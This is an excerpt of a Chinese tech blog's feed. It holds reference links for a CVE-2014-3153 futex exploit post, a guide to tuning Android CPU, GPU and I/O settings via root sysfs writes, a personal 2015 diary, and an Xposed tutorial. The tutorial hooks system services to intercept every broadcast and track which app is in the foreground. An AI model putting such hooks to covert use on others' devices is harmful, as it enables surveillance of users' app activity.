<h2 id="参考">参考</h2><p><a href="http://tinyhack.com/2014/07/07/exploiting-the-futex-bug-and-uncovering-towelroot/" target="_blank" rel="external">Exploiting the Futex Bug and uncovering Towelroot</a><br><a href="http://blog.topsec.com.cn/ad_lab/cve2014-3153/" target="_blank" rel="external">cve2014-3153 漏洞之详细分析与利用</a><br><a href="http://thecjw.0ginr.com/blog/archives/564" target="_blank" rel="external">CVE-2014-3153笔记</a><br><a href="http://blog.nativeflow.com/the-futex-vulnerability" target="_blank" rel="external">The Futex Vulnerability</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="简介">简介</h2><p>漏洞是14年5月份爆，属于linux内核漏洞，影响范围非常广，包括linux系统（内核版本3.14.5之前）和andorid系统（系统版本4.4之前）。受影响的系统可能被直接DOS，精心设计可以获取root权限，如安卓root工具tow]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓CPU,GPU,IO,缓存工作模式查看与修改]]></title>
    <link href="http://blog.idhyt.com/2016/01/10/andorid-work-mode-cpu-gpu-io/"/>
    <id>http://blog.idhyt.com/2016/01/10/andorid-work-mode-cpu-gpu-io/</id>
    <published>2016-01-10T14:31:24.000Z</published>
    <updated>2017-01-02T09:03:13.000Z</updated>
    <content type="html"><![CDATA[<h2 id="CPU工作模式">CPU工作模式</h2><h3 id="简介">简介</h3><p>在android系统的耗电量排行里，cpu的耗电占了比较大的一部分比例，也就是说，cpu的使用率和使用频率将直接或间接的影响电量的分配和使用，同时也会影响系统的流畅度。android-sdk中没有为android的开发者提供类似cpu管理的功能，但是当下很多省电类应用或专业的cpu管理软件都提供了cpu的降频甚至是超频的功能。</p>
<h3 id="主要的几种CPU调控模式">主要的几种CPU调控模式</h3><ul>
<li>ondemand（按需响应模式）：系统默认的超频模式，在最大最小频率之间自动调整 (有高级设置 )</li>
<li>interactive（交流循环模式）：只要手机运行频率直接上最高值，然后CPU负荷慢慢降低（系统响应最快，耗电多一些）</li>
<li>conservative（保守模式）：随着CPU负荷加大，逐步提升频率到最高，然后降至最低（系统响应快，耗电比I模式省）</li>
<li>smartass：是I和C模式的升级，该模式在比i模式不差的响应的前提下会做到了更加省电</li>
<li>performance（高性能模式）：高性能模式，按你设定范围的最好频率运行(机器最流畅,耗电也最大)</li>
<li>userspace（用户隔离模式）：当setcpu处于非工作状态时控制cpu速度的一种方法，官方建议最好不使用该选项</li>
<li>powersave（省电模式）：按设定最小频率低负荷运行，省电但系统响应速度慢</li>
</ul>
<h3 id="CPU模式查看">CPU模式查看</h3><p>查看命令<code>cat [%cpuFreqPath%]/cpuinfo_cur_freq</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_cur_freq   (当前cpu频率)</span><br><span class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq  (最大cpu频率)</span><br><span class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq  (最小cpu频率)</span><br><span class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/related_cpus  (cpu数量标号,从<span class="number">0</span>开始,如果是双核,结果为<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies  (cpu所有可用频率)</span><br><span class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors  (cpu所有可用调控模式)</span><br><span class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor (当前使用哪种调控模式)</span><br><span class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_transition_latency (变频延迟)</span><br></pre></td></tr></table></figure>
<p>MI3的cpu支持6种模式：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interactive conservative ondemand powersave userspace performance</span><br></pre></td></tr></table></figure></p>
<p>普通的andriod机默认的CPU模式为<code>ondemand</code>，MIUI 7的CPU模式为<code>interactive</code>，该模式下系统响应最快，所以最直观的效果就是系统更流畅。360手机的CPU也是用的该模式。</p>
<h3 id="CPU模式更改">CPU模式更改</h3><p>更改CPU模式需要root权限，如更改cpu调控模式：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"你想使用的调控模式"</span> /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是，重启后修改的会还原。</p>
<h2 id="GPU工作模式">GPU工作模式</h2><p>GPU渲染对电量的影响非常大，长时间使用OPENGL绘制3D动画也是非常非常耗电的，在足够日常使用的前提下适当的调节GPU，会降低手机发热量，达到省电效果。</p>
<h3 id="查看GPU可用频率">查看GPU可用频率</h3><p>高通Gpu支持查看频率和更改，英伟达不支持。</p>
<p>目录<code>/sys/class/kgsl/kgsl-3d0</code>文件为例说明：</p>
<ul>
<li>gpuclk: This prints out the current clock rate for the GPU.</li>
<li>max_gpuclk: The maximum clock the GPU will pick.</li>
<li>idle_timer: We’re not going to touch this now but this value means the time after the GPU is used to keep the GPU in a ‘ready’ state. Set it too high and power will be terrible, set it too low and both power AND performance will be terrible. I’d just leave it alone.</li>
<li>pwrscale/avail_policies: This is a list of available algorithms used for calculating the optimal GPU frequency.</li>
<li>pwrscale/policy: This is the current algorithm used, probably trustzone. Trustzone means the algorithm is somewhere else out of the kernel so you won’t know what it’s actually doing.</li>
</ul>
<p>查看命令：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">3</span>d0/gpu_available_frequencies <span class="comment">//可用频率</span></span><br><span class="line">cat /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">3</span>d0/max_gpuclk <span class="comment">//最大频率</span></span><br><span class="line">cat /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">3</span>d0/gpuclk <span class="comment">//当前频率</span></span><br><span class="line">...</span><br><span class="line">cat /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">2</span>d0/gpu_available_frequencies</span><br></pre></td></tr></table></figure></p>
<h3 id="修改GPU频率">修改GPU频率</h3><p>修改gpu最大工作频率：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">200000000</span> &gt; /sys/<span class="keyword">class</span>/kgsl/kgsl-<span class="number">3</span>d0/max_gpuclk</span><br></pre></td></tr></table></figure></p>
<p>降频一般通过更改最大频率来实现的。</p>
<h2 id="IO_Scheduler">IO Scheduler</h2><p>io scheduler完全决定了磁盘的读写性能，而这对于用户体验的影响是极大的。</p>
<h3 id="I/O调度的几种算法">I/O调度的几种算法</h3><h4 id="cfq">cfq</h4><p>completely-fair-quening完全公平队列，是anticipatory模式的替代品，没有过多的做预测性调度，而是根据给定的进程io优先级，直接来分配操作的顺序。这个模式在linux上表现良好，但也许并不是最适合android的io调度模式，太强调均衡，而降低了连续读写数据的性能。高通默认的就是这个，强烈建议改掉，根本不适合移动设备。</p>
<h4 id="noop">noop</h4><p>这个调度模式会把所有的数据请求直接合并到一个简单的队列里。不适合有机械结构的存储器，因为没有优化顺序，会增加额外的寻道时间。属于最简单的一个调度模式，无视io操作优先级和复杂性，执行完一个再执行一个，如果读写操作繁多的话，就会造成效率降低。nvidia默认，有时候会造成顿卡，但是这个scheduler对省电比较有帮助。</p>
<h4 id="deadline">deadline</h4><p>顾名思义，用过期时间来排序io操作顺序，保证先出现的io请求有最短的延迟时间，相对于写操作，给读操作更优先的级别。是比较好的一个调度模式，性能不错。</p>
<h4 id="row">row</h4><p>read over write，这个scheduler会优先处理读的请求，在移动设备上读的请求远远多于并且重要于写的请求，并且随机读取速度很重要。这个governor允许单或者双线程的读写，在同时有读写的情况下优先保证读，比较适合移动设备。</p>
<h4 id="fiops">fiops</h4><p>fair-iops这个调度器虽然和cfq一样追求平均的优先级，但是是根据闪存设备重新设计的一个governor，各方面表现良好，是列出来的五个scheduler里面性能最好的一个，如果有，强烈推荐fiops。</p>
<h4 id="sio">sio</h4><p>simple－io在安卓上其实调度器越简单效果越好。sio就是最简单的一个调度器。不过还是有缺点的，就是随即读写性能不太好。在fiops出来以后，这个scheduler基本就被冷落了。</p>
<h3 id="查看调度算法">查看调度算法</h3><p>查看当前系统支持的IO调度算法<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dmesg | grep -i scheduler</span><br><span class="line">&lt;6&gt;[    0.364114] C1 [      swapper/0, 1] io scheduler noop registered</span><br><span class="line">&lt;6&gt;[    0.364120] C1 [      swapper/0, 1] io scheduler deadline registered</span><br><span class="line">&lt;6&gt;[    0.364131] C1 [      swapper/0, 1] io scheduler row registered (default)</span><br><span class="line">&lt;6&gt;[    0.364185] C1 [      swapper/0, 1] io scheduler cfq registered</span><br><span class="line">&lt;6&gt;[    0.364192] C1 [      swapper/0, 1] io scheduler test-iosched registered</span><br></pre></td></tr></table></figure></p>
<p>查看当前系统的I/O调度方法<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/block/mmcblk0/<span class="built_in">queue</span>/scheduler</span><br><span class="line">noop deadline [row] cfq test-iosched</span><br></pre></td></tr></table></figure></p>
<p>其中[]为当前正在使用的调度方法</p>
<h3 id="更改调度方法">更改调度方法</h3><p>更改I/O当前系统调度方法:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo noop &gt; /sys/block/mmcblk0/<span class="built_in">queue</span>/scheduler</span><br></pre></td></tr></table></figure></p>
<h2 id="Read_Ahead_Buffer">Read Ahead Buffer</h2><p>按理说缓存应该是越大越好，但是在安卓上好像不是这样，是越大越省电，越小系统越流畅。</p>
<h3 id="查看当前缓存">查看当前缓存</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内置闪存：</span><br><span class="line">cat /sys/block/mmcblk0/quene/read_ahead_kb</span><br><span class="line"></span><br><span class="line">SD卡：</span><br><span class="line">cat /sys/block/mmcblk1/quene/read_ahead_kb</span><br></pre></td></tr></table></figure>
<h3 id="修改默认缓存">修改默认缓存</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内置闪存：</span><br><span class="line">echo 你想要的大小 &gt; /sys/block/mmcblk0/quene/read_ahead_kb</span><br><span class="line"></span><br><span class="line">sd卡：</span><br><span class="line">echo 你想要的大小 &gt; /sys/block/mmcblk1/quene/read_ahead_kb</span><br></pre></td></tr></table></figure>
<p>MI3默认为512K，如果想省电可以设成2048k。</p>
<h2 id="Demo">Demo</h2><p>一个Demo用于查看和修改cpu,gpu,io,缓存，效果如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/android-cpu-gpu-io-123.jpg" alt="AndroidDeviceInfo"><br>源码查看: <a href="https://github.com/idhyt/AndroidDeviceInfo" target="_blank" rel="external">AndroidDeviceInfo</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="CPU工作模式">CPU工作模式</h2><h3 id="简介">简介</h3><p>在android系统的耗电量排行里，cpu的耗电占了比较大的一部分比例，也就是说，cpu的使用率和使用频率将直接或间接的影响电量的分配和使用，同时也会影响系统的流畅度。andro]]>
    </summary>
    
      <category term="android" scheme="http://blog.idhyt.com/tags/android/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[我的2015]]></title>
    <link href="http://blog.idhyt.com/2016/01/01/diary-annual-summary-2015/"/>
    <id>http://blog.idhyt.com/2016/01/01/diary-annual-summary-2015/</id>
    <published>2015-12-31T18:40:11.000Z</published>
    <updated>2016-01-03T10:08:54.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;昨晚失眠，做了一个梦，仿佛回到了从前，也仿佛穿越到了不远的将来，半梦半醒中依稀记得是一个悬疑故事，里边很多熟悉的人，眯着眼睛拿着手机记录了一些情节，打算写篇小说。</p>
<hr>

<p>&#160; &#160; &#160; &#160;今年的跨年异常冷清，公司早早的都没有人，出去走了一圈，可能是有些晚的缘故，路边和商场都没有人，或许是我没走对路，又或许是太晚了，于是去吃了鸡肉卷外加四个鸡翅，迎接新年的到来。2016你好，2015再见。</p>
<hr>

<p>&#160; &#160; &#160; &#160;惯性思维的回想了下今年的生活轨迹，好像能想起来的真的挺少的，工作的缘故，业余生活也基本没有了，朋友越来越少，所有记住的东西也就没多少了。今年工作已经切到移动端了，但是感觉成长总是很慢很慢，越来越迷茫，好像想要的工作方式都要忘记了，生活上也有些烦恼，意外的惊喜与瞬间的跌落，然后莫名奇妙的删了别人的微信，总觉得自己对任何事情都能很理智的去控制，但在某个时刻依然会想那么多。那时候我有这样一种想法，放下工作出去走走，迷茫也好，逃避也罢，我甚至已经拿出地图研究好了如何完整的走完整个鸡形地图，可能一切的想法都是出去放松的借口，可能想那么多又有什么用呢。或许又是意外的去学了游泳将我注意力转到了游泳上边，慢慢的想法也没有那么强烈了，但是总觉得这种想法会在某个特定的时间点等我去做且不可不做。</p>
<hr>

<p>&#160; &#160; &#160; &#160;8月份请了年假回家了一周，顺便把身份证和驾驶证都换了，还办了护照和签证，回来后换了房子室友还有两条狗。再然后就是参加了新项目并且突然被派去北京出差了一个月，就在去北京的前一天我可是已经订好了去上海参加会议的机票了，朋友都约好了，真是个悲伤的故事，其实我真的还挺想去上海看看。北京的一个月出差也是记忆深刻，每天除了工作就是睡觉，总结下来就是忙成狗，好几个朋友都没有见。还有，天冷是测试吃货的最好环境，不吃冷啊，所有回来妥妥胖了6斤，还好减了下来了。毕业之前有在北京实习过将近一年，所以对北京还比较了解，在北京出差过程中也感受到了很多奇奇怪怪的想法和令人诧异的工作气氛，他们用成功学告诉你什么是梦想，告诉你要有追求，告诉你要表现出欲望，告诉你这些他都不care，我不能怂，可我特么连生活问题都还没解决让我拿什么画梦想，很多时候不是说对物质没有追求，而是不想把暂时得不到的东西看的太重，不是没有不行，而是有了更好。想到了之前看的一个故事，黄鼠狼在养鸡场的山崖边立了块碑，上面写着：“抛弃传统的禁锢，不勇敢的跳下去，你怎么知道自己不是一只鹰！” 接下来这畜生每天就在崖底吃着摔下来的鸡。这个故事告诉我们，阅读所谓的“心灵鸡汤”需要智商和智慧，大多鸡汤都是黄鼠狼炖的。这又是一个悲伤的故事。</p>
<hr>

<p>&#160; &#160; &#160; &#160;仔细想想最有成就感的事情好像就是把游泳学会了，还是蛙泳，不过也多亏了一个热心的大(shu)哥(shu)指导，不然我还是用狗刨的姿态在蛙泳。其中也间歇性的在跑步，不过跑步也要看状态，有时候一周每天都跑，有时候也会隔天跑，运行这种事情真的要随性，一旦以某种目的去运动，总觉得失去了很多心态上的东西，可能我是不喜欢有压力的感觉。游戏也没怎么玩了，年初在网咖冲的钱用到现在还有400多，想想都是坑，上半年倒是又玩了两个月的大话西游，不过最后把东西全卖了还赚了几百开钱，当时想想还挺开心的，后来我折合了下时间，平均一小时连10块钱都没赚到，这还是一个悲伤的故事。</p>
<hr>

<p>&#160; &#160; &#160; &#160;突然又是一年，总恍惚的觉得有些不可思议，前两天又看到了读研时候爬山拍的mv，又想到了那些欢乐的时光，那些熟悉的人，毕业以后就再也没有见到过了，人的惰性总会让人长久活在自己的世界里，忽然有天想去找个朋友聊聊天，我该去找谁，互联网时代，出门不带没有电话没有短信的手机也会没有安全感，作为一个互联网工作者，不是是幸运的还是不幸的。</p>
<hr>

<p>&#160; &#160; &#160; &#160;凌晨朋友圈又在刷新年祝福和新年愿望，又到许愿的时候了，翻了翻前几年总结写的愿望，一个都没有实现，再想想一直希望的事情，我特么连2011年的愿望都还没实现，满屏幕悲伤的故事，就不许愿了吧，怕想多了神灯也救不了我，如果必须有个愿望来证明2016来了，那么我就祝福我的朋友愿望都能如愿以偿吧，因为我是好人?雷锋:神灯。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;昨晚失眠，做了一个梦，仿佛回到了从前，也仿佛穿越到了不远的将来，半梦半醒中依稀记得是一个悬疑故事，里边很多熟悉的人，眯着眼睛拿着手机记录了一些情节，打算写篇小说。</p>
<hr>

<p>&#160; &#160; &]]>
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓注入框架Xposed用法详解]]></title>
    <link href="http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/"/>
    <id>http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/</id>
    <published>2015-11-27T17:11:11.000Z</published>
    <updated>2016-09-05T15:23:39.000Z</updated>
    <content type="html"><![CDATA[<p>&#160;&#160;&#160;&#160;之前<a href="http://blog.idhyt.com/2015/09/25/android-injection-xposed/">安卓注入框架Xposed分析与简单应用</a>只是简单的了解了一下xposed框架，知道如何hook函数，并没有深入去使用，也不知道这个框架能用到哪种程度，最近详细的总结了下，简单来说就是，没有hook不到的地方，只有你想不到的地方。</p>
<h2 id="接管系统所有广播包">接管系统所有广播包</h2><p>&#160;&#160;&#160;&#160;在Android四大组件中，Broadcast是一种广泛运用的在应用程序之间传输信息的机制。而BroadcastReceiver 是对发送出来的Broadcast进行过滤接受并响应的一类组件。应用通过BroadcastReceiver对一个外部的事件做出响应，这是非常有意思的，当开机，锁屏等外部事件到来的时候，可以利用BroadcastReceiver进行相应的处理。如果你能接管所有的广播包，基本上就接管了整个系统的信息传输过程。广播包也是频繁唤醒手机的一个重要原因，通过管理这些广播包，可以达到省电效果。</p>
<p>通过阅读源代码中<br><a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/com/android/server/firewall/IntentFirewall.java#IntentFirewall" target="_blank" rel="external">IntentFirewall</a>这个类，126行代码开始有一些以<code>check</code>开头的方法，说明如下:</p>
<pre><code>This is called from ActivityManager to<span class="instruction"> check </span>if a start activity intent should be allowed. It is assumed the caller is already holding the global ActivityManagerService lock.
</code></pre><p>说明很清晰的告诉我们，所有activity启动时，会到这里做相应的检测是否被允许，因此我们hook掉<code>checkBroadcast</code>方法，就可以控制所有的广播包走向。checkBroadcast代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkBroadcast</span><span class="params">(Intent intent, <span class="keyword">int</span> callerUid, <span class="keyword">int</span> callerPid,</span><br><span class="line">    String resolvedType, <span class="keyword">int</span> receivingUid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> checkIntent(mBroadcastResolver, intent.getComponent(), TYPE_BROADCAST, intent, callerUid, callerPid, resolvedType, receivingUid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里，我通过hook该方法并获取到第一个参数<code>Intent intent</code>，然后就可以获取到广播类型，同时也可以获取到该广播的发送者(callerUid)和接受者(receivingUid)，hook代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hook_method(<span class="string">"com.android.server.firewall.IntentFirewall"</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">"checkBroadcast"</span>,</span><br><span class="line">                Intent.class,   <span class="comment">// intent</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// callerUid</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// callerPid</span></span><br><span class="line">                String.class,   <span class="comment">// resolvedType</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// receivingUid</span></span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> callerUid = (<span class="keyword">int</span>) param.args[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> receivingUid = (<span class="keyword">int</span>) param.args[<span class="number">4</span>];</span><br><span class="line">                XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"broadcast from "</span> + callerUid + <span class="string">" to "</span> + receivingUid);</span><br><span class="line"></span><br><span class="line">                Intent intent = (Intent) param.args[<span class="number">0</span>];</span><br><span class="line">                String action = intent.getAction();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (action == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">if</span> (action.equals(<span class="string">"android.intent.action.SCREEN_OFF"</span>))</span><br><span class="line">                    XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"screen off"</span>);</span><br><span class="line">                <span class="keyword">if</span> (action.equals(<span class="string">"android.intent.action.SCREEN_ON"</span>))</span><br><span class="line">                    XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"screen on"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>打印锁屏和亮屏的广播事件，结果如下所示：<br>过滤日志<code>adb logcat | grep checkBroadcast</code></p>
<p><img src="http://o9xrwsn0z.bkt.clouddn.com/android-xposed-usage-1.jpg" alt="checkBroadcast"></p>
<h2 id="嵌套hook监控前台应用">嵌套hook监控前台应用</h2><p>&#160;&#160;&#160;&#160;在编写代码时候，要实现实时监控前台应用是相当棘手的一件事情，并且在5.11以后的版本获取所有运行app都已经受到限制，stackoverflow中给出了一种方法，<a href="http://stackoverflow.com/questions/30619349/android-5-1-1-and-above-getrunningappprocesses-returns-my-application-packag" target="_blank" rel="external">Get Running Apps on M with no permissions &amp; get the foreground app on Android 5.1.1+</a>，测试了获取前台应用的代码相当耗性能。这里基于xposed框架给出另外一种方法。</p>
<p>同样通过阅读源代码中的<a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/com/android/server/net/NetworkPolicyManagerService.java" target="_blank" rel="external">NetworkPolicyManagerService</a>这个类，找到回调函数<code>onForegroundActivitiesChanged</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> IProcessObserver mProcessObserver = <span class="keyword">new</span> IProcessObserver.Stub() &#123;</span><br><span class="line"></span><br><span class="line">	<span class="annotation">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onForegroundActivitiesChanged</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> uid, <span class="keyword">boolean</span> foregroundActivities)</span> </span>&#123;</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="annotation">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProcessStateChanged</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> uid, <span class="keyword">int</span> procState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span> (mRulesLock) &#123;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ActivityManager服务中IProcessObserver有个回调函数onForegroundActivitiesChanged。而动态设置网络连接规则的时候，NetworkPolicyManagerService服务通过检测系统发出的一些相关事件（在NetworkPolicyManagerService的启动systemReady函数中注册），其中会调用ActivityManager服务中IProcessObserver的onForegroundActivitiesChanged及onProcessDied回调事件，因此，我们通过hook服务类NetworkPolicyManagerService中的onForegroundActivitiesChanged回调函数来监控前台应用，但是这个过程必须保证在systemReady函数已启动注册了该服务，因此需要嵌套hook。具体过程如下：</p>
<blockquote>
<ol>
<li>hook systemReady函数</li>
<li>通过<code>param.thisObject</code>获取hook方法所在类的实例，<br>即<code>NetworkPolicyManagerService.class</code></li>
<li>通过<code>getObjectField</code>获取类中的对象<code>mProcessObserver</code></li>
<li>hook对象<code>mProcessObserver</code>中的<code>onForegroundActivitiesChanged</code>方法</li>
</ol>
</blockquote>
<p>完整代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hook_method(<span class="string">"com.android.server.net.NetworkPolicyManagerService"</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">"systemReady"</span>,</span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady"</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady : "</span> + param.thisObject.getClass());</span><br><span class="line"></span><br><span class="line">                Object mProcessObserverClass = XposedHelpers.getObjectField(param.thisObject, <span class="string">"mProcessObserver"</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady : "</span> + mProcessObserverClass.getClass());</span><br><span class="line"></span><br><span class="line">                hook_method(mProcessObserverClass.getClass(),</span><br><span class="line">                        <span class="string">"onForegroundActivitiesChanged"</span>,</span><br><span class="line">                        <span class="keyword">int</span>.class,  <span class="comment">// pid</span></span><br><span class="line">                        <span class="keyword">int</span>.class,  <span class="comment">// uid</span></span><br><span class="line">                        <span class="keyword">boolean</span>.class, <span class="comment">// foregroundActivities</span></span><br><span class="line">                        <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                    <span class="annotation">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> ((<span class="keyword">boolean</span>) param.args[<span class="number">2</span>])</span><br><span class="line">                            XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.onForegroundActivitiesChanged : foreground uid = "</span> + param.args[<span class="number">1</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>打印前台应用，结果如下所示：<br>过滤日志<code>adb logcat | grep onForegroundActivitiesChanged</code></p>
<p><img src="http://o9xrwsn0z.bkt.clouddn.com/android-xposed-usage-2.jpg" alt="onForegroundActivitiesChanged"></p>
